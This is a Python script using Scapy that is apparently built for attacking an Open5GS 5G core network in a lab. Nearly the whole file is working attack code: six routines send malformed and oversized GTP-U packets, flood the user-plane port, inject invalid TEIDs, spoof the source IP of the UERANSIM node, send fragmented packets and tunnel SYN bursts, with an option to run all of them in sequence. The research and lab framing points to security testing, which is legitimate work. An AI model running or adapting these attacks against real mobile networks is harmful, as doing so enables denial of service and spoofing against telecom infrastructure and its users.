#!/usr/bin/env python3
"""
GTP-U Attack Tool for 5G Security Testing
Target: Open5GS Core Network
Author: Research Purpose Only
"""

from scapy.all import *
from scapy.contrib.gtp import *
import sys
import time
import argparse

# Network Configuration
OPEN5GS_IP = "192.168.88.12"    # VM1 Open5GS
UERANSIM_IP = "192.168.88.147"   # VM2 UERANSIM  
ATTACKER_IP = "192.168.88.xxx"   # VM3 - Will be detected automatically
GTP_PORT = 2152

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "192.168.88.1"

class GTPAttacker:
    def __init__(self, target_ip, source_ip=None):
        self.target_ip = target_ip
        self.source_ip = source_ip or get_local_ip()
        print(f"[*] Attacker IP: {self.source_ip}")
        print(f"[*] Target IP: {self.target_ip}")
        
    def create_gtp_packet(self, inner_payload, teid=1, seq=0):
        """Create GTP-U packet"""
        # Outer IP + UDP + GTP + Inner IP
        pkt = IP(dst=self.target_ip, src=self.source_ip) / \
              UDP(sport=GTP_PORT, dport=GTP_PORT) / \
              GTPHeader(gtp_type=255, teid=teid, seq=seq) / \
              inner_payload
        return pkt
    
    def attack_1_malformed_gtp(self, count=20):
        """Attack 1: Send malformed GTP packets"""
        print("\n[*] Attack 1: Malformed GTP Packets")
        print(f"[*] Sending {count} malformed packets...")
        
        for i in range(count):
            # Create oversized inner packet
            inner = IP(dst="8.8.8.8", src="10.45.0.2") / \
                    ICMP(type=8, code=0) / \
                    Raw(load="A" * 2000)  # Oversized payload
            
            pkt = self.create_gtp_packet(inner, teid=1)
            send(pkt, verbose=0)
            
            if (i + 1) % 5 == 0:
                print(f"[+] Sent {i + 1}/{count} packets")
            time.sleep(0.2)
        
        print(f"[✓] Attack 1 completed: {count} packets sent\n")
    
    def attack_2_gtp_flood(self, count=100, rate=0.01):
        """Attack 2: GTP-U Flood"""
        print("\n[*] Attack 2: GTP-U Flood Attack")
        print(f"[*] Sending {count} packets at {rate}s interval...")
        
        for i in range(count):
            inner = IP(dst="8.8.8.8", src="10.45.0.2") / \
                    UDP(sport=12345, dport=53) / \
                    Raw(load="FLOOD" * 100)
            
            pkt = self.create_gtp_packet(inner, teid=1, seq=i)
            send(pkt, verbose=0)
            
            if (i + 1) % 20 == 0:
                print(f"[+] Sent {i + 1}/{count} packets")
            time.sleep(rate)
        
        print(f"[✓] Attack 2 completed: {count} packets sent\n")
    
    def attack_3_invalid_teid(self):
        """Attack 3: Invalid TEID values"""
        print("\n[*] Attack 3: Invalid TEID Attack")
        
        invalid_teids = [0, 9999, 0xFFFF, 0xFFFFFFFF, 12345, 99999]
        
        for teid in invalid_teids:
            inner = IP(dst="8.8.8.8", src="10.45.0.2") / ICMP()
            pkt = self.create_gtp_packet(inner, teid=teid)
            send(pkt, verbose=0)
            print(f"[+] Sent packet with TEID: 0x{teid:08x}")
            time.sleep(0.3)
        
        print(f"[✓] Attack 3 completed: {len(invalid_teids)} packets sent\n")
    
    def attack_4_spoofed_source(self, count=30):
        """Attack 4: Spoofed source IP"""
        print("\n[*] Attack 4: Spoofed Source IP Attack")
        print(f"[*] Spoofing source as UERANSIM: {UERANSIM_IP}")
        
        for i in range(count):
            inner = IP(dst="1.1.1.1", src="10.45.0.3") / \
                    ICMP() / Raw(load="SPOOF")
            
            # Spoof source IP as UERANSIM
            pkt = IP(dst=self.target_ip, src=UERANSIM_IP) / \
                  UDP(sport=GTP_PORT, dport=GTP_PORT) / \
                  GTPHeader(gtp_type=255, teid=1) / inner
            
            send(pkt, verbose=0)
            
            if (i + 1) % 10 == 0:
                print(f"[+] Sent {i + 1}/{count} spoofed packets")
            time.sleep(0.15)
        
        print(f"[✓] Attack 4 completed: {count} packets sent\n")
    
    def attack_5_fragmented_gtp(self, count=15):
        """Attack 5: Fragmented GTP packets"""
        print("\n[*] Attack 5: Fragmented GTP Packets")
        
        for i in range(count):
            # Create large inner packet that will be fragmented
            inner = IP(dst="8.8.8.8", src="10.45.0.2", flags="MF") / \
                    UDP(sport=5000, dport=5000) / \
                    Raw(load="FRAGMENT" * 200)
            
            pkt = self.create_gtp_packet(inner, teid=1)
            
            # Fragment the outer packet
            frags = fragment(pkt, fragsize=800)
            for frag in frags:
                send(frag, verbose=0)
            
            print(f"[+] Sent fragmented packet set {i + 1}/{count}")
            time.sleep(0.3)
        
        print(f"[✓] Attack 5 completed: {count} fragmented packet sets sent\n")
    
    def attack_6_rapid_burst(self, burst_size=50, bursts=3):
        """Attack 6: Rapid burst attack"""
        print("\n[*] Attack 6: Rapid Burst Attack")
        print(f"[*] {bursts} bursts of {burst_size} packets each")
        
        for burst in range(bursts):
            print(f"[+] Burst {burst + 1}/{bursts}...")
            
            for i in range(burst_size):
                inner = IP(dst="8.8.8.8", src="10.45.0.2") / \
                        TCP(sport=RandShort(), dport=80, flags="S")
                
                pkt = self.create_gtp_packet(inner, teid=1)
                send(pkt, verbose=0)
            
            print(f"[✓] Burst {burst + 1} completed")
            time.sleep(2)  # Wait between bursts
        
        print(f"[✓] Attack 6 completed: {bursts * burst_size} packets sent\n")

def main():
    parser = argparse.ArgumentParser(description='GTP-U Attack Tool')
    parser.add_argument('-t', '--target', default=OPEN5GS_IP,
                        help='Target IP (Open5GS)')
    parser.add_argument('-a', '--attack', type=int, choices=range(1, 8),
                        help='Attack type (1-7), 7 for all')
    parser.add_argument('-c', '--count', type=int, default=20,
                        help='Number of packets to send')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("   GTP-U Attack Tool - 5G Security Research")
    print("=" * 60)
    print(f"Target: {args.target}")
    print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    attacker = GTPAttacker(args.target)
    
    if args.attack:
        attack_type = args.attack
    else:
        print("\nAvailable Attacks:")
        print("1. Malformed GTP packets")
        print("2. GTP-U flood")
        print("3. Invalid TEID")
        print("4. Spoofed source IP")
        print("5. Fragmented GTP packets")
        print("6. Rapid burst attack")
        print("7. Run ALL attacks")
        print()
        attack_type = int(input("Select attack type (1-7): "))
    
    try:
        if attack_type == 1:
            attacker.attack_1_malformed_gtp(args.count)
        elif attack_type == 2:
            attacker.attack_2_gtp_flood(args.count)
        elif attack_type == 3:
            attacker.attack_3_invalid_teid()
        elif attack_type == 4:
            attacker.attack_4_spoofed_source(args.count)
        elif attack_type == 5:
            attacker.attack_5_fragmented_gtp(args.count // 2)
        elif attack_type == 6:
            attacker.attack_6_rapid_burst()
        elif attack_type == 7:
            print("\n[*] Running ALL attacks sequentially...\n")
            attacker.attack_1_malformed_gtp(20)
            time.sleep(1)
            attacker.attack_2_gtp_flood(50)
            time.sleep(1)
            attacker.attack_3_invalid_teid()
            time.sleep(1)
            attacker.attack_4_spoofed_source(30)
            time.sleep(1)
            attacker.attack_5_fragmented_gtp(15)
            time.sleep(1)
            attacker.attack_6_rapid_burst()
        else:
            print("[-] Invalid attack type")
            return
        
        print("\n" + "=" * 60)
        print("[✓] All attacks completed successfully!")
        print("=" * 60)
        print("\nNext steps:")
        print("1. Check packet capture on Open5GS VM")
        print("2. Analyze with Wireshark using filter: gtp")
        print("3. Look for attack patterns in pcap file")
        
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script requires root privileges")
        print("[!] Please run with: sudo python3 gtp_attack.py")
        sys.exit(1)
    
    main()
